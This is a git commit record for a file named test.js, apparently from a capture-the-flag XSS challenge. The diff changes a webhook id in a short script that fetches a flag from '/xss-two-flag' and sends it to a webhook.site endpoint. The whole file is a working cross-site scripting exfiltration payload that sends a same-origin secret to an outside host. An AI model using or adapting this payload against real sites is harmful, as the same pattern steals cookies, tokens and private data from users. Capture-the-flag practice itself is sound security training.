f675baca7ce89a058f488acb011fbf6ac101cd33
frejus2007 <frejusazombade@gmail.com>
2026-03-21 00:32:53 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 fetch('/xss-two-flag')
   .then(r => r.text())
   .then(flag => {
-    fetch('https://webhook.site/abc-123?flag=' + encodeURIComponent(flag));
+    fetch('https://webhook.site/cf758e55-f9ce-47be-a51d-5950b978c6c1?flag=' + encodeURIComponent(flag));
   });
